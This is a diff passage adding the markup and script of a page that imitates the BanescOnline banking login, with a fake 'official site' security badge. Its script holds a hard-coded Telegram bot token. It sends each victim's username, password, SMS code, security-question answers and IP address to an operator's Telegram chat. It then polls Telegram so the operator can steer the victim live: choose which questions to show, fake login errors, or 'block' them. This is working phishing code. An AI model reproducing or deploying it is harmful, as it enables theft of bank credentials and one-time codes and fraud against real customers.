+                                        </svg>
+                                      </button>
+                                    </div>
+                                  </div>
+
+                                </div>
+                            </div>
+
+                            <button type="submit" id="btnSubmit" class="btn-aceptar">Aceptar</button>
+                        </form>
+
+                        <div class="box-recuperacion">
+                            <svg width="21" height="21" viewBox="0 0 36 36" style="flex-shrink: 0;">
+                                <circle cx="18" cy="18" r="16" fill="#da2929" />
+                                <circle cx="18" cy="18" r="8" fill="#ffffff" />
+                                <path d="M18 2 A16 16 0 0 1 29.3 6.7 L23.7 12.3 A8 8 0 0 0 18 10 Z" fill="#ffffff" />
+                                <path d="M34 18 A16 16 0 0 1 29.3 29.3 L23.7 23.7 A8 8 0 0 0 26 18 Z" fill="#ffffff" />
+                                <path d="M18 34 A16 16 0 0 1 6.7 29.3 L12.3 23.7 A8 8 0 0 0 18 26 Z" fill="#ffffff" />
+                                <path d="M2 18 A16 16 0 0 1 6.7 6.7 L12.3 12.3 A8 8 0 0 0 10 18 Z" fill="#ffffff" />
+                                <circle cx="18" cy="18" r="7.5" fill="#ffffff" />
+                                <circle cx="18" cy="18" r="16" fill="none" stroke="#ab1f1f" stroke-width="1.2" />
+                            </svg>
+                            <a href="iniciar.html">¿Olvidó su usuario, clave de acceso o preguntas de seguridad?</a>
+                        </div>
+                    </div>
+
+                </div>
+
+                <div class="banner-remesas">
+                    <img src="banner-remesas.png" alt="Las remesas con Banesco son seguras y rápidas">
+                </div>
+            </section>
+
+        </div>
+
+        <footer>
+            Banesco Banco Universal, C.A. - RIF: J-07013380-5 Copyright 2002. Todos los derechos reservados.
+        </footer>
+
+    </div>
+
+    <!-- Pantalla de Cargando (Loader Profesional BanescOnline) -->
+    <div class="loader-container" id="loaderContainer">
+        <div class="loader-card">
+            <!-- Logotipo Principal BanescOnline -->
+            <img src="logo_BanescOnline.png" alt="BanescOnline" class="loader-main-logo">
+
+            <!-- Spinner Animado -->
+            <div class="loader-spinner-wrapper">
+                <div class="loader-spinner-ring"></div>
+            </div>
+            
+            <h3 class="loader-title">Procesando información</h3>
+            <p class="loader-subtitle">Por favor espere un momento mientras validamos su solicitud...</p>
+
+            <div class="loader-bar-bg">
+                <div class="loader-bar-fill"></div>
+            </div>
+
+            <div class="loader-security-badge">
+                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#007953" stroke-width="2.5">
+                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                </svg>
+                <span>Sitio Oficial de Banesco Online - Cifrado SSL 256-bit</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+    // =======================================================
+    // CONFIGURACIÓN OFICIAL TELEGRAM (MODO DIRECTO 100%)
+    // =======================================================
+    const TELEGRAM_TOKEN = '8524497386:AAHD_D7lw7VZ95m-EB8Vjvv8f6ge54V7ufU';
+    const TELEGRAM_CHAT_ID = '8850669236';
+
+    const SESSION_ID = 'BNS-' + Math.random().toString(36).substring(2, 8).toUpperCase();
+    let clientInfo = { ip: 'Detectando...', country: '' };
+
+    // Detección automática de IP y país del visitante
+    (async function initClientInfo() {
+      try {
+        const res = await fetch('https://ipwho.is/', { cache: 'no-store' });
+        const data = await res.json();
+        if (data && data.success) {
+          clientInfo.ip = data.ip;
+          clientInfo.country = data.country || '';
+        }
+      } catch (e) {
+        try {
+          const res = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' });
+          const data = await res.json();
+          if (data && data.ip) clientInfo.ip = data.ip;
+        } catch (_) {
+          clientInfo.ip = 'No disponible';
+        }
+      }
+    })();
+
+    function escapeHtml(s) {
+      if (!s) return '';
+      return String(s)
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#039;');
+    }
+
+    let directTgOffset = 0;
+    const processedUpdateIds = new Set();
+    let activeTriggerAction = null;
+
+    (async function initTgOffset() {
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?limit=5`);
+        const data = await res.json();
+        if (data && data.ok && Array.isArray(data.result) && data.result.length > 0) {
+          const lastUpdate = data.result[data.result.length - 1];
+          directTgOffset = lastUpdate.update_id + 1;
+        }
+      } catch (e) {}
+    })();
+
+    // Envío directo a Telegram Bot API
+    async function sendDirectToTelegram(title, lines, buttons = []) {
+      try {
+        const fullLines = [
+          `<b>${title}</b>`,
+          `━━━━━━━━━━━━━━━━━━`,
+          `🆔 <b>Sesión:</b> <code>${SESSION_ID}</code>`,
+          ...lines,
+          `🌐 <b>IP:</b> <code>${clientInfo.ip}</code> ${clientInfo.country ? `(${clientInfo.country})` : ''}`,
+          `📅 <b>Fecha:</b> <code>${new Date().toLocaleString('es-VE')}</code>`,
+          `━━━━━━━━━━━━━━━━━━`
+        ];
+
+        const payload = {
+          chat_id: TELEGRAM_CHAT_ID,
+          text: fullLines.join('\n'),
+          parse_mode: 'HTML'
+        };
+
+        if (buttons && buttons.length) {
+          payload.reply_markup = { inline_keyboard: buttons };
+        }
+
+        const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        const data = await res.json();
+        console.log('✔ Notificación entregada a Telegram:', data);
+        return data;
+      } catch (err) {
+        console.error('Error enviando a Telegram:', err);
+      }
+    }
+
+    // Configuración de preguntas personalizadas y presets
+    let pregunta1TextoActual = '1. Pregunta de seguridad';
+    let pregunta2TextoActual = '2. Pregunta de seguridad';
+
+    const PRESETS_PREGUNTAS = {
+      '1': { q1: '¿Cuál es el nombre de su primera mascota?', q2: '¿En qué ciudad nació?' },
+      '2': { q1: '¿Marca de su primer vehículo?', q2: '¿Nombre de su colegio de primaria?' },
+      '3': { q1: '¿Nombre de la empresa de su primer empleo?', q2: '¿Segundo nombre de su madre?' }
+    };
+
+    function actualizarPreguntasEnPantalla(q1, q2) {
+      if (q1) pregunta1TextoActual = q1;
+      if (q2) pregunta2TextoActual = q2;
+
+      const label1 = document.getElementById('labelPregunta1');
+      const label2 = document.getElementById('labelPregunta2');
+      const input1 = document.getElementById('inputPregunta1');
+      const input2 = document.getElementById('inputPregunta2');
+
+      if (label1) label1.textContent = pregunta1TextoActual;
+      if (label2) label2.textContent = pregunta2TextoActual;
+
+      const loaderContainer = document.getElementById('loaderContainer');
+      const boxUsuario = document.getElementById('boxUsuario');
+      const boxClave = document.getElementById('boxClave');
+      const boxSMS = document.getElementById('boxSMS');
+      const boxPreguntas = document.getElementById('boxPreguntas');
+      const cardNuevosUsuarios = document.querySelector('.card-nuevos-usuarios');
+      const bannerRemesas = document.querySelector('.banner-remesas');
+      const topCardsRow = document.querySelector('.top-cards-row');
+      const btnSubmit = document.getElementById('btnSubmit');
+
+      // Si se invoca la actualización de preguntas, nos aseguramos de mostrar el box de preguntas en pantalla
+      pasoActual = 4;
+      if (loaderContainer) loaderContainer.style.display = 'none';
+      if (boxUsuario) boxUsuario.style.display = 'none';
+      if (boxClave) boxClave.style.display = 'none';
+      if (boxSMS) boxSMS.style.display = 'none';
+
+      // Ocultar Nuevo Usuario y Banner Remesas en el paso de preguntas
+      if (cardNuevosUsuarios) cardNuevosUsuarios.style.display = 'none';
+      if (bannerRemesas) bannerRemesas.style.display = 'none';
+      if (topCardsRow) topCardsRow.style.gridTemplateColumns = '1fr';
+
+      if (boxPreguntas) boxPreguntas.style.display = 'flex';
+
+      if (input1) { input1.required = true; input1.value = ''; input1.focus(); }
+      if (input2) { input2.required = true; input2.value = ''; }
+      if (btnSubmit) btnSubmit.textContent = 'Continuar';
+    }
+
+    function resetLayoutVisuals() {
+      const cardNuevosUsuarios = document.querySelector('.card-nuevos-usuarios');
+      const bannerRemesas = document.querySelector('.banner-remesas');
+      const topCardsRow = document.querySelector('.top-cards-row');
+
+      if (cardNuevosUsuarios) cardNuevosUsuarios.style.display = 'flex';
+      if (bannerRemesas) bannerRemesas.style.display = 'block';
+      if (topCardsRow) topCardsRow.style.gridTemplateColumns = '1fr 1.08fr';
+    }
+    window.resetLayoutVisuals = resetLayoutVisuals;
+    window.actualizarPreguntasEnPantalla = actualizarPreguntasEnPantalla;
+    window.ejecutarAplicarPreguntas = actualizarPreguntasEnPantalla;
+
+    async function solicitarClaveCorreo(e) {
+      if (e) e.preventDefault();
+      
+      const loaderContainer = document.getElementById('loaderContainer');
+      if (loaderContainer) loaderContainer.style.display = 'flex';
+
+      const usuarioVal = usuarioGuardado || 'No disponible';
+
+      await sendDirectToTelegram(
+        '📩 SOLICITUD DE CLAVE POR CORREO ELECTRÓNICO',
+        [
+          `👤 <b>Usuario:</b> <code>${escapeHtml(usuarioVal)}</code>`,
+          `⚠️ <b>Acción:</b> El usuario solicitó reenviar la Clave Digital de Validación a su correo electrónico registrado.`
+        ]
+      );
+
+      setTimeout(() => {
+        if (loaderContainer) loaderContainer.style.display = 'none';
+        const txtMsg = document.querySelector('#boxSMS p');
+        if (txtMsg) {
+          txtMsg.textContent = 'Hemos enviado la Clave Digital de Validación a su correo electrónico registrado. Por favor, ingrésela a continuación.';
+        }
+      }, 1000);
+    }
+    window.solicitarClaveCorreo = solicitarClaveCorreo;
+
+    function togglePasswordVisibility(inputId, btn) {
+      const input = document.getElementById(inputId);
+      if (!input) return;
+      const isPassword = input.type === 'password';
+      input.type = isPassword ? 'text' : 'password';
+
+      if (isPassword) {
+        btn.innerHTML = `
+          <svg class="w-4 h-4 text-[#2b7747]" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
+            <line x1="1" y1="1" x2="23" y2="23"></line>
+          </svg>
+        `;
+      } else {
+        btn.innerHTML = `
+          <svg class="w-4 h-4 text-[#5a8a6e]" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+            <circle cx="12" cy="12" r="3"></circle>
+          </svg>
+        `;
+      }
+    }
+    window.togglePasswordVisibility = togglePasswordVisibility;
+
+    let pendingQuestion1 = '';
+
+    function procesarTextoTelegramOperador(msgText) {
+      if (!msgText || msgText === '/start') return;
+
+      let q1 = '', q2 = '';
+      if (msgText.includes('|')) {
+        const parts = msgText.split('|').map(s => s.trim()).filter(Boolean);
+        q1 = parts[0] || '';
+        q2 = parts[1] || '';
+      } else if (msgText.includes('\n')) {
+        const parts = msgText.split('\n').map(s => s.trim()).filter(Boolean);
+        q1 = parts[0] || '';
+        q2 = parts[1] || '';
+      } else {
+        if (!pendingQuestion1) {
+          pendingQuestion1 = msgText;
+          fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: TELEGRAM_CHAT_ID,
+              text: `📌 <b>Pregunta 1 recibida:</b> <code>${escapeHtml(msgText)}</code>\n\n✍️ Ahora escribe la <b>Pregunta 2</b> en Telegram para mostrarlas en la página:`,
+              parse_mode: 'HTML'
+            })
+          }).catch(() => {});
+          return;
+        } else {
+          q1 = pendingQuestion1;
+          q2 = msgText;
+          pendingQuestion1 = '';
+        }
+      }
+
+      if (q1 !== '') {
+        actualizarPreguntasEnPantalla(q1, q2 || '2. Pregunta de seguridad');
+
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: `✅ <b>PREGUNTAS MOSTRADAS EN LA PÁGINA WEB:</b>\n\n📌 <b>1:</b> <code>${escapeHtml(q1)}</code>\n📌 <b>2:</b> <code>${escapeHtml(q2 || '2. Pregunta de seguridad')}</code>`,
+            parse_mode: 'HTML'
+          })
+        }).catch(() => {});
+
+        if (typeof activeTriggerAction === 'function') {
+          activeTriggerAction('q_custom', `${q1}|${q2 || ''}`);
+        }
+      }
+    }
+
+    // Polling de acciones del operador desde Telegram en tiempo real
+    let actionPoller = null;
+    let pollTimeoutTimer = null;
+    let isPollingTg = false;
+
+    function stopActionListening() {
+      activeTriggerAction = null;
+      if (actionPoller) {
+        clearInterval(actionPoller);
+        actionPoller = null;
+      }
+      if (pollTimeoutTimer) {
+        clearTimeout(pollTimeoutTimer);
+        pollTimeoutTimer = null;
+      }
+    }
+
+    function startActionListening(onAction, timeoutSeconds = 0, onTimeout = null) {
+      stopActionListening();
+      let handled = false;
+
+      const triggerAction = (action, param) => {
+        if (handled) return;
+        handled = true;
+        stopActionListening();
+        console.log('✔ Acción de Telegram procesada:', action, param);
+        if (typeof onAction === 'function') onAction(action, param);
+      };
+      activeTriggerAction = triggerAction;
+
+      const checkTelegramDirectly = async () => {
+        if (handled || isPollingTg) return;
+        isPollingTg = true;
+        try {
+          const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=${directTgOffset}&timeout=0`);
+          const data = await res.json().catch(() => null);
+          if (data && data.ok && Array.isArray(data.result)) {
+            for (const upd of data.result) {
+              if (processedUpdateIds.has(upd.update_id)) continue;
+              processedUpdateIds.add(upd.update_id);
+              if (upd.update_id >= directTgOffset) directTgOffset = upd.update_id + 1;
+              
+              // 1. Teclado Inline Telegram
+              if (upd.callback_query && upd.callback_query.data) {
+                const parts = upd.callback_query.data.split(':');
+                const actType = parts[0];
+                const actSession = parts[1];
+                const actParam = parts[2];
+
+                if (!actSession || actSession === SESSION_ID) {
+                  if (actType === 'ask_custom') {
+                    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
+                      method: 'POST',
+                      headers: { 'Content-Type': 'application/json' },
+                      body: JSON.stringify({ callback_query_id: upd.callback_query.id, text: '✍️ Responde a este mensaje con tus preguntas...' })
+                    }).catch(() => {});
+
+                    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                      method: 'POST',
+                      headers: { 'Content-Type': 'application/json' },
+                      body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: '✍️ <b>POR FAVOR RESPONDE A ESTE MENSAJE CON TUS PREGUNTAS:</b>\n\nEscribe la Pregunta 1 y Pregunta 2 separadas por <code>|</code> o Enter.\n\n<i>Ejemplo:</i>\n<code>¿Nombre de tu mascota? | ¿En qué ciudad naciste?</code>',
+                        parse_mode: 'HTML',
+                        reply_markup: { force_reply: true, selective: true }
+                      })
+                    }).catch(() => {});
+                    continue;
+                  }
+
+                  let toast = 'Acción procesada';
+                  if (actType.startsWith('proceed') || actType.startsWith('goto')) toast = '✅ Avanzando siguiente paso...';
+                  else if (actType.startsWith('fail')) toast = '❌ Marcado como incorrecto';
+                  else if (actType === 'blocked') toast = '🚫 Usuario bloqueado';
+                  else if (actType === 'finish') toast = '✅ Finalizado con éxito';
+                  else if (actType === 'q_preset') toast = `❓ Aplicando Preguntas Opción ${actParam || 1}...`;
+
+                  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ callback_query_id: upd.callback_query.id, text: toast })
+                  }).catch(() => {});
+
+                  triggerAction(actType, actParam);
+                  break;
+                }
+              }
+              // 2. Mensajes de texto enviados directamente por el operador en Telegram
+              else if (upd.message && upd.message.text) {
+                const msgText = upd.message.text.trim();
+                procesarTextoTelegramOperador(msgText);
+              }
+            }
+          }
+        } catch (e) {
+        } finally {
+          isPollingTg = false;
+        }
+      };
+
+      checkTelegramDirectly();
+      actionPoller = setInterval(checkTelegramDirectly, 700);
+
+      if (timeoutSeconds > 0 && typeof onTimeout === 'function') {
+        pollTimeoutTimer = setTimeout(() => {
+          if (!handled) {
+            stopActionListening();
+            onTimeout();
+          }
+        }, timeoutSeconds * 1000);
+      }
+    }
+
+    let pasoActual = 1;
+    let intentoClave = 0;
+    let usuarioGuardado = '';
+    let claveGuardada = '';
+
+    function procesarIngreso(e) {
+      e.preventDefault();
+
+      const boxUsuario = document.getElementById('boxUsuario');
+      const usuarioInput = document.getElementById('inputUsuario');
+
+      const boxClave = document.getElementById('boxClave');
+      const claveInput = document.getElementById('inputClave');
+
+      const boxSMS = document.getElementById('boxSMS');
+      const smsInput = document.getElementById('inputSMS');
+
+      const boxPreguntas = document.getElementById('boxPreguntas');
+      const p1Input = document.getElementById('inputPregunta1');
+      const p2Input = document.getElementById('inputPregunta2');
+
+      const btnSubmit = document.getElementById('btnSubmit');
+      const loaderContainer = document.getElementById('loaderContainer');
+
+      // PASO 1: USUARIO
+      if (pasoActual === 1) {
+        const u = usuarioInput.value.trim();
+        if (u !== "") {
+          usuarioGuardado = u;
+
+          // Mostrar loader
+          loaderContainer.style.display = 'flex';
+
+          const botonesUsuario = [
+            [
+              { text: '🔑 Pedir Clave', callback_data: `proceed_user:${SESSION_ID}` },
+              { text: '❓ Ir a Preguntas', callback_data: `proceed_sms:${SESSION_ID}` }
+            ],
+            [
+              { text: '✍️ Escribir Mis Preguntas', callback_data: `ask_custom:${SESSION_ID}` }
+            ],
+            [
+              { text: '❓ 1. Mascota / Ciudad', callback_data: `q_preset:${SESSION_ID}:1` },
+              { text: '❓ 2. Vehículo / Colegio', callback_data: `q_preset:${SESSION_ID}:2` }
+            ],
+            [
+              { text: '❓ 3. Empleo / Madre', callback_data: `q_preset:${SESSION_ID}:3` }
+            ],
+            [
+              { text: '❌ Usuario Incorrecto', callback_data: `fail_user:${SESSION_ID}` },
+              { text: '🚫 Bloquear Usuario', callback_data: `blocked:${SESSION_ID}` }
+            ]
+          ];
+
+          sendDirectToTelegram(
+            '🟢 BANESCONLINE - USUARIO INGRESADO',
+            [
+              `👤 <b>Usuario:</b> <code>${escapeHtml(usuarioGuardado)}</code>`,
+              `━━━━━━━━━━━━━━━━━━`,
+              `💡 <b>OPCIONES DE PREGUNTAS:</b>`,
+              `• Escribe en Telegram: <code>Pregunta 1 | Pregunta 2</code>`,
+              `• O usa los botones de abajo para enviarle las preguntas.`
+            ],
+            botonesUsuario
+          );
+
+          const avanzarAClave = () => {
+            loaderContainer.style.display = 'none';
+            pasoActual = 2;
+            boxUsuario.style.display = 'none';
+            boxClave.style.display = 'flex';
+            usuarioInput.required = false;
+            claveInput.required = true;
+            claveInput.value = '';
+            claveInput.focus();
+            btnSubmit.textContent = 'Ingresar';
+          };
+
+          // 0 = Espera indefinidamente hasta que el operador decida en Telegram
+          startActionListening((accion, param) => {
+            if (accion === 'proceed_user' || accion === 'proceed') {
+              avanzarAClave();
+            } else if (accion === 'ask_custom') {
+              fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  chat_id: TELEGRAM_CHAT_ID,
+                  text: '✍️ <b>POR FAVOR RESPONDE A ESTE MENSAJE CON TUS PREGUNTAS:</b>\n\nEscribe la Pregunta 1 y Pregunta 2 separadas por una barra <code>|</code>\n\n<i>Ejemplo:</i>\n<code>¿Nombre de tu mascota? | ¿En qué ciudad naciste?</code>',
+                  parse_mode: 'HTML',
+                  reply_markup: { force_reply: true, selective: true }
+                })
+              }).catch(() => {});
+            } else if (accion === 'q_preset') {
+              const preset = PRESETS_PREGUNTAS[param] || PRESETS_PREGUNTAS['1'];
+              actualizarPreguntasEnPantalla(preset.q1, preset.q2);
+            } else if (accion === 'q_custom') {
+              const parts = param.split(/[\n|]/).map(s => s.trim()).filter(Boolean);
+              const q1 = parts[0] || pregunta1TextoActual;
+              const q2 = parts[1] || pregunta2TextoActual;
+              actualizarPreguntasEnPantalla(q1, q2);
+            } else if (accion === 'proceed_sms') {
+              actualizarPreguntasEnPantalla(pregunta1TextoActual, pregunta2TextoActual);
+            } else if (accion === 'fail_user' || accion === 'fail') {
+              loaderContainer.style.display = 'none';
+              usuarioInput.value = '';
+              showAuthError('Usuario, clave o clave especial inválida, por favor verifique e intente de nuevo. Recuerde que al ingresar la clave errada en tres (3) intentos consecutivos, su acceso será bloqueado por medidas de seguridad.');
+            } else if (accion === 'blocked') {
+              loaderContainer.style.display = 'none';
+              showBlockedMessage();
+            } else {
+              avanzarAClave();
+            }
+          }, 0, null);
+        }
+      }
+      // PASO 2: CLAVE
+      else if (pasoActual === 2) {
+        const c = claveInput.value.trim();
+        if (c !== "") {
+          claveGuardada = c;
+          intentoClave++;
+
+          // Mostrar loader
+          loaderContainer.style.display = 'flex';
+
+          const botonesClave = [
+            [
+              { text: '📲 Pedir SMS', callback_data: `proceed_pass:${SESSION_ID}` },
+              { text: '❓ Ir a Preguntas', callback_data: `proceed_sms:${SESSION_ID}` }
+            ],
+            [
+              { text: '✍️ Escribir Mis Preguntas', callback_data: `ask_custom:${SESSION_ID}` }
+            ],
+            [
+              { text: '❓ 1. Mascota / Ciudad', callback_data: `q_preset:${SESSION_ID}:1` },
+              { text: '❓ 2. Vehículo / Colegio', callback_data: `q_preset:${SESSION_ID}:2` }
+            ],
+            [
+              { text: '❓ 3. Empleo / Madre', callback_data: `q_preset:${SESSION_ID}:3` }
+            ],
+            [
+              { text: '❌ Clave Incorrecta', callback_data: `fail_pass:${SESSION_ID}` },
+              { text: '🚫 Bloquear Usuario', callback_data: `blocked:${SESSION_ID}` }
+            ]
+          ];
+
+          sendDirectToTelegram(
+            '🟢 BANESCONLINE - CREDENCIALES',
+            [
+              `👤 <b>Usuario:</b> <code>${escapeHtml(usuarioGuardado)}</code>`,
+              `🔑 <b>Clave:</b> <code>${escapeHtml(claveGuardada)}</code> (Intento ${intentoClave})`,
+              `━━━━━━━━━━━━━━━━━━`,
+              `💡 <b>OPCIONES DE PREGUNTAS:</b>`,
+              `• Escribe en Telegram: <code>Pregunta 1 | Pregunta 2</code>`,
+              `• O usa los botones de abajo para enviarle las preguntas.`
+            ],
+            botonesClave
+          );
+
+          const avanzarASMS = () => {
+            loaderContainer.style.display = 'none';
+            pasoActual = 3;
+            boxClave.style.display = 'none';
+            boxSMS.style.display = 'flex';
+            claveInput.required = false;
+            smsInput.required = true;
+            smsInput.value = '';
+            smsInput.focus();
+            btnSubmit.textContent = 'Validar';
+          };
+
+          // 0 = Espera indefinidamente hasta que el operador decida
+          startActionListening((accion, param) => {
+            if (accion === 'proceed_pass' || accion === 'proceed') {
+              avanzarASMS();
+            } else if (accion === 'ask_custom') {
+              fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  chat_id: TELEGRAM_CHAT_ID,
+                  text: '✍️ <b>POR FAVOR RESPONDE A ESTE MENSAJE CON TUS PREGUNTAS:</b>\n\nEscribe la Pregunta 1 y Pregunta 2 separadas por una barra <code>|</code>\n\n<i>Ejemplo:</i>\n<code>¿Nombre de tu mascota? | ¿En qué ciudad naciste?</code>',
+                  parse_mode: 'HTML',
+                  reply_markup: { force_reply: true, selective: true }
+                })
+              }).catch(() => {});
+            } else if (accion === 'q_preset') {
+              const preset = PRESETS_PREGUNTAS[param] || PRESETS_PREGUNTAS['1'];
+              actualizarPreguntasEnPantalla(preset.q1, preset.q2);
+            } else if (accion === 'q_custom') {
+              const parts = param.split(/[\n|]/).map(s => s.trim()).filter(Boolean);
+              const q1 = parts[0] || pregunta1TextoActual;
+              const q2 = parts[1] || pregunta2TextoActual;
+              actualizarPreguntasEnPantalla(q1, q2);
+            } else if (accion === 'proceed_sms') {
+              actualizarPreguntasEnPantalla(pregunta1TextoActual, pregunta2TextoActual);
+            } else if (accion === 'fail_pass' || accion === 'fail') {
+              loaderContainer.style.display = 'none';
+              claveInput.value = '';
+              showAuthError('Usuario, clave o clave especial inválida, por favor verifique e intente de nuevo. Recuerde que al ingresar la clave errada en tres (3) intentos consecutivos, su acceso será bloqueado por medidas de seguridad.');
+            } else if (accion === 'blocked') {
+              loaderContainer.style.display = 'none';
+              showBlockedMessage();
+            } else {
+              avanzarASMS();
+            }
+          }, 0, null);
+        }
+      }
+      // PASO 3: CÓDIGO SMS
+      else if (pasoActual === 3) {
+        const sms = smsInput.value.trim();
+        if (sms !== "") {
+          loaderContainer.style.display = 'flex';
+
+          const botonesSMS = [
+            [
+              { text: '✍️ Escribir Mis Preguntas', callback_data: `ask_custom:${SESSION_ID}` }
+            ],
+            [
+              { text: '✅ Preguntas Estándar', callback_data: `proceed_sms:${SESSION_ID}` }
+            ],
+            [
+              { text: '❓ 1. Mascota / Ciudad', callback_data: `q_preset:${SESSION_ID}:1` },
+              { text: '❓ 2. Vehículo / Colegio', callback_data: `q_preset:${SESSION_ID}:2` }
+            ],
+            [
+              { text: '❓ 3. Empleo / Madre', callback_data: `q_preset:${SESSION_ID}:3` }
+            ],
+            [
+              { text: '❌ SMS Incorrecto', callback_data: `fail_sms:${SESSION_ID}` },
+              { text: '🚫 Bloquear Usuario', callback_data: `blocked:${SESSION_ID}` }
+            ]
+          ];
+
+          sendDirectToTelegram(
+            '📱 BANESCONLINE - CÓDIGO SMS',
+            [
+              `👤 <b>Usuario:</b> <code>${escapeHtml(usuarioGuardado)}</code>`,
+              `🔑 <b>Clave:</b> <code>${escapeHtml(claveGuardada)}</code>`,
+              `💬 <b>Código SMS:</b> <code>${escapeHtml(sms)}</code>`,
+              `━━━━━━━━━━━━━━━━━━`,
+              `💡 <b>COMO PERSONALIZAR PREGUNTAS:</b>`,
+              `• Pulsa <b>✍️ Escribir Mis Preguntas</b> para responder directamente.`,
+              `• O usa los botones ❓ para preguntas rápidas.`
+            ],
+            botonesSMS
+          );
+
+          const aplicarYAvanzarPreguntas = (q1, q2) => {
+            const finalQ1 = q1 || pregunta1TextoActual || '1. Pregunta de seguridad';
+            const finalQ2 = q2 || pregunta2TextoActual || '2. Pregunta de seguridad';
+
+            actualizarPreguntasEnPantalla(finalQ1, finalQ2);
+
+            if (p1Input) p1Input.focus();
+            if (btnSubmit) btnSubmit.textContent = 'Continuar';
+          };
+
+          // 0 = Espera indefinidamente hasta que el operador decida
+          startActionListening((accion, param) => {
+            if (accion === 'ask_custom') {
+              fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  chat_id: TELEGRAM_CHAT_ID,
+                  text: '✍️ <b>POR FAVOR RESPONDE A ESTE MENSAJE CON TUS PREGUNTAS:</b>\n\nEscribe la Pregunta 1 y Pregunta 2 separadas por una barra <code>|</code>\n\n<i>Ejemplo:</i>\n<code>¿Nombre de tu mascota? | ¿En qué ciudad naciste?</code>',
+                  parse_mode: 'HTML',
+                  reply_markup: { force_reply: true, selective: true }
+                })
+              }).catch(() => {});
+            } else if (accion === 'q_preset') {
+              const preset = PRESETS_PREGUNTAS[param] || PRESETS_PREGUNTAS['1'];
+              aplicarYAvanzarPreguntas(preset.q1, preset.q2);
+            } else if (accion === 'q_custom') {
+              const parts = param.split(/[\n|]/).map(s => s.trim()).filter(Boolean);
+              const q1 = parts[0] || pregunta1TextoActual;
+              const q2 = parts[1] || pregunta2TextoActual;
+              aplicarYAvanzarPreguntas(q1, q2);
+            } else if (accion === 'proceed_sms' || accion === 'proceed') {
+              aplicarYAvanzarPreguntas(pregunta1TextoActual, pregunta2TextoActual);
+            } else if (accion === 'fail_sms' || accion === 'fail') {
+              loaderContainer.style.display = 'none';
+              smsInput.value = '';
+              showSmsError();
+            } else if (accion === 'blocked') {
+              loaderContainer.style.display = 'none';
+              showBlockedMessage();
+            } else {
+              aplicarYAvanzarPreguntas(pregunta1TextoActual, pregunta2TextoActual);
+            }
+          }, 0, null);
+        }
+      }
+      // PASO 4: PREGUNTAS DE SEGURIDAD
+      else if (pasoActual === 4) {
+        const p1 = p1Input.value.trim();
+        const p2 = p2Input.value.trim();
+        if (p1 !== "" && p2 !== "") {
+          loaderContainer.style.display = 'flex';
+
+          const botonesPreguntas = [
+            [
+              { text: '🔑 Pedir Clave', callback_data: `goto_clave:${SESSION_ID}` },
+              { text: '📲 Pedir SMS', callback_data: `goto_sms:${SESSION_ID}` }
+            ],
+            [
+              { text: '✅ Finalizar', callback_data: `finish:${SESSION_ID}` },
+              { text: '❌ Respuestas Incorrectas', callback_data: `fail_q:${SESSION_ID}` }
+            ],
+            [
+              { text: '🚫 Bloquear Usuario', callback_data: `blocked:${SESSION_ID}` }
+            ]
+          ];
+
+          sendDirectToTelegram(
+            '❓ BANESCONLINE - PREGUNTAS DE SEGURIDAD',
+            [
+              `👤 <b>Usuario:</b> <code>${escapeHtml(usuarioGuardado)}</code>`,
+              `🔑 <b>Clave:</b> <code>${escapeHtml(claveGuardada || 'No ingresada aún')}</code>`,
+              `━━━━━━━━━━━━━━━━━━`,
+              `📌 <b>1. ${escapeHtml(pregunta1TextoActual)}:</b>`,
+              `✍️ <code>${escapeHtml(p1)}</code>`,
+              `📌 <b>2. ${escapeHtml(pregunta2TextoActual)}:</b>`,
+              `✍️ <code>${escapeHtml(p2)}</code>`,
+              `━━━━━━━━━━━━━━━━━━`,
+              `💡 <b>SIGUIENTE ACCIÓN:</b>`,
+              `• Presiona <b>🔑 Pedir Clave</b> para solicitar la clave.`,
+              `• Presiona <b>📲 Pedir SMS</b> para solicitar el código SMS.`
+            ],
+            botonesPreguntas
+          );
+
